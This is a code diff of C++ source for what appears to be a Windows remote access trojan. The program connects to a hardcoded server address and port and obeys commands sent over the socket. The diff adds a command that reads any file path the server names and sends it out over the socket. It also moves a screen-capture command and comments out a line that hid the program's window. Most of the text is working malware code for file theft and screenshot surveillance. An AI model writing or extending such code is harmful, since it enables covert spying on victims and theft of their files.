@@ -10,7 +10,7 @@
 
 #define PORT 666
 #define SERVERADDR "192.168.1.69"
-#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "GdiPlus.lib")
 
@@ -149,30 +149,12 @@ int main(int argc, char* argv[])
 		}
 		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')) {
 			std::string result = buff + 4;
+			MessageBox(0, result.c_str(), "System", MB_OK);
 		}
-		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'c')) {
-			using namespace Gdiplus;
-			GdiplusStartupInput gdiplusStartupInput;
-			ULONG_PTR gdiplusToken;
-			GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-
-			HDC scrdc, memdc;
-			HBITMAP membit;
-			scrdc = GetDC(0);
-			int Height, Width;
-			Height = GetSystemMetrics(SM_CYSCREEN);
-			Width = GetSystemMetrics(SM_CXSCREEN);
-			memdc = CreateCompatibleDC(scrdc);
-			membit = CreateCompatibleBitmap(scrdc, Width, Height);
-			SelectObject(memdc, membit);
-			BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
-			HBITMAP hBitmap;
-			hBitmap = (HBITMAP)SelectObject(memdc, membit);
-			Gdiplus::Bitmap bitmap(hBitmap, NULL);
-			bitmap.Save(L"screen.png", &png);
-			DeleteObject(hBitmap);
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'd')) {
+			string fop = buff + 4;
 			FILE *in1;
-			fopen_s(&in1, "shablon.mp4", "rb");
+			fopen_s(&in1, fop.c_str(), "rb");
 			const int buflen = 1024;
 			bool end = false;
 			bool end2 = false;
@@ -196,14 +178,77 @@ int main(int argc, char* argv[])
 						end = true;
 					}
 					int size = ftell(in1);
-					if (b != 0) send(my_sock, bufer, buflen, 0);
-					if (end2) {break; }
+					send(my_sock, bufer, buflen, 0);
+					if (end2) { break; }
 				}
 				else {
 					bufer[buflen - 1] = '@';
 					bufer[buflen - 2] = '@';
 					bufer[buflen - 3] = '^';
 					send(my_sock, bufer, buflen, 0);
+					break;
+				}
+			}
+			fclose(in1);
+		}
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'c')) {
+			using namespace Gdiplus;
+			GdiplusStartupInput gdiplusStartupInput;
+			ULONG_PTR gdiplusToken;
+			GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+			HDC scrdc, memdc;
+			HBITMAP membit;
+			scrdc = GetDC(0);
+			int Height, Width;
+			Height = GetSystemMetrics(SM_CYSCREEN);
+			Width = GetSystemMetrics(SM_CXSCREEN);
+			memdc = CreateCompatibleDC(scrdc);
+			membit = CreateCompatibleBitmap(scrdc, Width, Height);
+			SelectObject(memdc, membit);
+			BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
+			HBITMAP hBitmap;
+			hBitmap = (HBITMAP)SelectObject(memdc, membit);
+			Gdiplus::Bitmap bitmap(hBitmap, NULL);
+			bitmap.Save(L"screen.png", &png);
+			DeleteObject(hBitmap);
+			FILE *in1;
+			fopen_s(&in1, "Client.exe", "rb");
+			const int buflen = 1024;
+			bool end = false;
+			bool end2 = false;
+			while (1) {
+				char bufer[buflen] = "";
+				if (!end) {
+					int b = fread(bufer, 1, sizeof(bufer), in1);
+					if (b < buflen - 2) {
+						bufer[buflen - 1] = '@';
+						bufer[buflen - 2] = '@';
+						bufer[buflen - 3] = '^';
+						end2 = true;
+					}
+					else if (b == (buflen - 2)) {
+						bufer[buflen - 1] = '\0';
+						bufer[buflen - 2] = '\0';
+						end = true;
+					}
+					else if (b == (buflen - 1)) {
+						bufer[buflen - 1] = '\0';
+						end = true;
+					}
+					else {
+						cout << "net\n";
+					}
+					int size = ftell(in1);
+					send(my_sock, bufer, buflen, 0);
+					if (end2) { cout << bufer; break; }
+				}
+				else {
+					bufer[buflen - 1] = '@';
+					bufer[buflen - 2] = '@';
+					bufer[buflen - 3] = '^';
+					send(my_sock, bufer, buflen, 0);
+					cout << bufer;
 					break;
 				}
 			}
